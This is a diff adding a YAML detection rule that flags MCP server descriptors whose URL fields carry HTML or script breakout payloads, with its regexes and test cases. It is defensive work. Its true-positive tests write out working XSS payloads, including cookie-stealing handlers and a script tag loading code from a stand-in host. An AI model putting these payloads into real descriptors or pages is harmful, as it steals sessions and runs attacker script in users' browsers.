@@ -1,0 +1,197 @@
+title: "MCP Server Descriptor URL Field Carries an HTML/Script Breakout Payload"
+id: ATR-2026-02514
+rule_version: 1
+status: experimental
+description: >
+  Detects a poisoned MCP server descriptor whose URL-typed metadata field
+  carries markup instead of a URL — the payload that executes wherever a
+  registry, catalogue or client renders server metadata.
+
+  Generalised from CVE-2026-44429 (MCP Registry < 1.7.7, CWE-79/CWE-116): the
+  public catalogue interpolated server.websiteUrl into a double-quoted href
+  via innerHTML, while server-side validation only checked that the value
+  parsed as an absolute https URL and never rejected quote characters. A
+  published server.json could therefore break out of the attribute and run
+  script in every visitor's browser. The descriptor is data an MCP client
+  ingests, so the same poisoned field reaches any surface that renders server
+  metadata — registry UIs, client server pickers, tool inspectors.
+
+  Detection targets the field-type contract: a metadata key that must hold a
+  URL, holding a value that also contains an inline event handler, a script
+  or markup element, or a script-executing scheme. Text fields such as
+  description are deliberately out of scope — ATR-2026-00571 already covers
+  script payloads in rendered agent/MCP output; this rule covers the narrower
+  case where the value's declared type makes markup unambiguously wrong.
+
+  Matching is confined to the INSIDE of the URL value: the bridge span is
+  [^"\x27\n] so it cannot run past the value's closing quote into a sibling
+  field, and the attribute-breakout condition requires an escaped quote
+  (\") — the act of closing the attribute — before the handler. Without both
+  constraints the rule fires on ordinary catalogue JSON that pairs a URL field
+  with an HTML field on the same line, and on URLs whose query string happens
+  to carry a parameter named onload=. Known blind spot accepted for precision:
+  a single-quoted descriptor broken out with a bare double quote is not
+  matched, because RE2 has no backreference to bind the value's delimiter.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: medium
+
+references:
+  owasp_llm:
+    - "LLM06:2025"
+  owasp_agentic:
+    - "ASI06:2026"
+  mitre_atlas:
+    - "AML.T0053 - LLM Plugin Compromise"
+  mitre_attack:
+    - "T1059.007 - JavaScript"
+  cve:
+    - "CVE-2026-44429"
+  cwe:
+    - "CWE-79"
+    - "CWE-116"
+  external:
+    - "https://nvd.nist.gov/vuln/detail/CVE-2026-44429"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+  cve: human-reviewed
+  cwe: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - { article: "15", context: "Article 15 cybersecurity — runtime detection of markup injection carried in MCP server descriptor URL fields.", strength: primary }
+    - { article: "9",  context: "Article 9 risk management — runtime risk-treatment control for poisoned MCP catalogue metadata.", strength: secondary }
+  nist_ai_rmf:
+    - { subcategory: "MP.5.1", context: "MAP 5.1 — adversarial input characterised/detected for MCP descriptor metadata poisoning.", strength: primary }
+    - { subcategory: "MG.3.2", context: "MANAGE 3.2 — runtime monitoring control for untrusted server metadata rendered to operators.", strength: secondary }
+  iso_42001:
+    - { clause: "8.1", context: "Clause 8.1 operational control — detection of markup payloads in URL-typed MCP metadata fields.", strength: primary }
+    - { clause: "8.3", context: "Clause 8.3 AI risk treatment — runtime detection as treatment control.", strength: secondary }
+
+tags:
+  category: tool-poisoning
+  subcategory: metadata-poisoning
+  scan_target: mcp
+  confidence: high
+  source: cve-disclosure
+  vendor_sources: nvd-cve-2026-44429
+  suppress_in_code_blocks: true
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "A data:image/... icon value — a legitimate inline image, not a script scheme."
+    - "A description or documentation field whose prose mentions onload, onerror or script tags."
+    - "Registry documentation explaining which characters the validator rejects."
+    - "javascript:void(0) / javascript:; navigation placeholders in legacy menu JSON — excluded explicitly."
+    - "A URL field followed on the same line by a sibling field holding HTML (logoHtml, embed, inline svg) — excluded: the bridge span cannot cross the value's closing quote."
+    - "A legitimate URL whose query string contains a parameter literally named onload=/onclick= — excluded: an attribute breakout must first close the attribute with an escaped quote."
+    - "KNOWN RESIDUAL: unfenced source code or prose that quotes a live breakout payload verbatim (e.g. the registry's own validator regression test) still matches. Markdown fenced/inline code blocks are suppressed; bare code is not separable by single-event regex. This is why the rule alerts rather than blocks."
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)["\x27](?:websiteUrl|website_url|homepage|homepage_?url|documentation_?url|docs_?url|iconUrl|icon_?url|repositoryUrl|repository_?url|source_?url)\\{0,2}["\x27]\s*:\s*\\{0,2}["\x27]\s*https?://[^"\x27\n]{0,40}\\{1,2}["\x27]\s*[^"\x27\n]{0,24}\bon(?:error|load|click|focus|mouseover|mouseenter|animationstart|toggle)\s*='
+      description: >
+        A URL-typed descriptor field whose value continues past the URL into an
+        inline event handler — the attribute breakout of CVE-2026-44429.
+    - field: content
+      operator: regex
+      value: '(?i)["\x27](?:websiteUrl|website_url|homepage|homepage_?url|documentation_?url|docs_?url|iconUrl|icon_?url|repositoryUrl|repository_?url|source_?url)\\{0,2}["\x27]\s*:\s*\\{0,2}["\x27]\s*(?:(?:java|vb)script:\s*(?:[^v;"\x27\s]|v[^o"\x27\s]|vo[^i"\x27\s]|voi[^d"\x27\s]|void\s*\(\s*[^0-9)\s])|data:text/html)'
+      description: >
+        A script-executing scheme where the descriptor contract requires an
+        http(s) URL.
+    - field: content
+      operator: regex
+      value: '(?i)["\x27](?:websiteUrl|website_url|homepage|homepage_?url|documentation_?url|docs_?url|iconUrl|icon_?url|repositoryUrl|repository_?url|source_?url)\\{0,2}["\x27]\s*:\s*\\{0,2}["\x27]\s*https?://[^"\x27\n]{0,40}(?:<\s*/\s*a\s*>|<\s*(?:script|img|svg|iframe)\b)'
+      description: >
+        A URL-typed field whose value closes the surrounding element and opens
+        a new markup element — the tag-breakout variant of the same flaw.
+
+response:
+  actions:
+    - alert
+  message_template: >
+    [ATR-2026-02514] MEDIUM: an MCP server descriptor's URL-typed metadata
+    field contains markup or a script scheme (CVE-2026-44429 class,
+    CWE-79/CWE-116). The value breaks out of the attribute it is interpolated
+    into. Reject the descriptor and validate that URL fields parse as http(s)
+    and contain no quote or angle-bracket characters.
+
+confidence: 80
+
+test_cases:
+  true_positives:
+    - tool_response: '{"name": "io.example/weather", "websiteUrl": "https://weather.example.com/\" onmouseover=\"fetch(String.fromCharCode(47,47)+document.cookie)"}'
+      expected: triggered
+      description: 'websiteUrl breaks out of the href attribute and attaches an inline event handler'
+    - tool_response: '{"name": "io.example/notes", "iconUrl": "javascript:fetch(document.location.origin)"}'
+      expected: triggered
+      description: 'Script-executing scheme in an icon URL field'
+    - tool_response: '{"name": "io.example/db", "homepage": "https://ok.example/</a><script src=https://x.example/p.js></script>"}'
+      expected: triggered
+      description: 'Tag breakout closing the anchor and injecting a script element'
+    - tool_response: '{"name": "io.example/git", "repositoryUrl": "vbscript:msgbox(1)"}'
+      expected: triggered
+      description: 'Generalisation: vbscript scheme in a different URL-typed field'
+    - tool_response: '{"iconUrl": "javascript:void(fetch(document.cookie))"}'
+      expected: triggered
+      description: 'Evasion: void() wrapper around a real call — must still fire, unlike the void(0) placeholder'
+    - tool_response: '{"payload": "{\\"websiteUrl\\":\\"https://ok.example/\\" onload=\\"x()\\"}"}'
+      expected: triggered
+      description: 'Evasion: the same breakout inside a double-escaped (JSON-in-JSON) descriptor envelope'
+    - tool_response: '{"websiteUrl": "https://ok.example/<svg onload=alert(1)>"}'
+      expected: triggered
+      description: 'svg element opened inside a URL-typed field'
+  true_negatives:
+    - tool_response: '{"name": "io.example/weather", "websiteUrl": "https://weather.example.com/docs", "repositoryUrl": "https://github.com/example/weather-mcp"}'
+      expected: not_triggered
+      description: 'Well-formed descriptor with ordinary https metadata URLs'
+    - tool_response: '{"name": "io.example/icons", "iconUrl": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUg"}'
+      expected: not_triggered
+      description: 'Inline data:image icon — legitimate, and not a script scheme'
+    - tool_response: '{"name": "io.example/ui", "description": "Renders onboarding pages; see the onload lifecycle notes at https://example.com/onload-hooks for details."}'
+      expected: not_triggered
+      description: 'Prose field mentioning onload with a URL — the near-boundary benign case'
+    - tool_response: 'The registry must reject websiteUrl values containing quote characters, because the catalogue interpolates them into an href attribute via innerHTML.'
+      expected: not_triggered
+      description: 'Advisory text describing the required validation in prose'
+    - tool_response: '{"name":"@acme/mcp-server","version":"2.1.0","homepage":"https://acme.dev","logoHtml":"<img src=\"/logo.svg\" alt=\"Acme\">"}'
+      expected: not_triggered
+      description: 'FP-regression: a sibling field holding HTML on the same line. The bridge span must not cross the URL value closing quote.'
+    - tool_response: '{"menu":[{"label":"Docs","homepage":"javascript:void(0)"},{"label":"Blog","homepage":"https://blog.acme.dev"}]}'
+      expected: not_triggered
+      description: 'FP-regression: javascript:void(0) navigation placeholder in legacy menu JSON'
+    - tool_response: '{"homepage":"https://acme.dev","cardHtml":"<img src=\"/a.png\" onerror=\"this.src=/fallback.png\">"}'
+      expected: not_triggered
+      description: 'FP-regression: ordinary lazy-image onerror fallback in a sibling HTML field'
+    - tool_response: '{"name":"database","iconUrl":"https://cdn.acme.dev/i/db.svg","svg":"<svg viewBox=\"0 0 24 24\"><path d=\"M4 6h16\"/></svg>"}'
+      expected: not_triggered
+      description: 'FP-regression: icon catalogue offering both a hosted iconUrl and the inline svg source'
+    - tool_response: '{"title":"Acme","homepage":"https://acme.dev","embed":"<iframe src=\"https://acme.dev/e\" loading=\"lazy\"></iframe>"}'
+      expected: not_triggered
+      description: 'FP-regression: an iframe embed field next to homepage in one-line JSON'
+    - tool_response: 'The dashboard embed accepts {"documentation_url": "https://docs.acme.dev/embed?theme=dark&onload=refresh"} for legacy widgets.'
+      expected: not_triggered
+      description: 'FP-regression: a legitimate URL whose query string carries a parameter literally named onload='
+    - tool_response: '<div class="card" data-config={"homepage":"https://acme.dev","iconUrl":"https://cdn.acme.dev/i.svg"} onload="initCard(this)"></div>'
+      expected: not_triggered
+      description: 'FP-regression: server-rendered HTML with JSON in data-config and a genuine onload handler on the element'
+    - tool_response: '{"a":{"homepage":"javascript:void(0);"},"b":{"homepage":"javascript:;"},"c":{"homepage":"javascript: void(0)"},"d":{"homepage":"javascript:void 0"}}'
+      expected: not_triggered
+      description: 'FP-regression: the full javascript: no-op placeholder family'
+    - tool_response: '| acme-mcp | "homepage": "https://acme.dev" | <img src="https://img.shields.io/npm/v/acme-mcp"> |'
+      expected: not_triggered
+      description: 'FP-regression: README table row pairing a homepage cell with a shields.io badge'
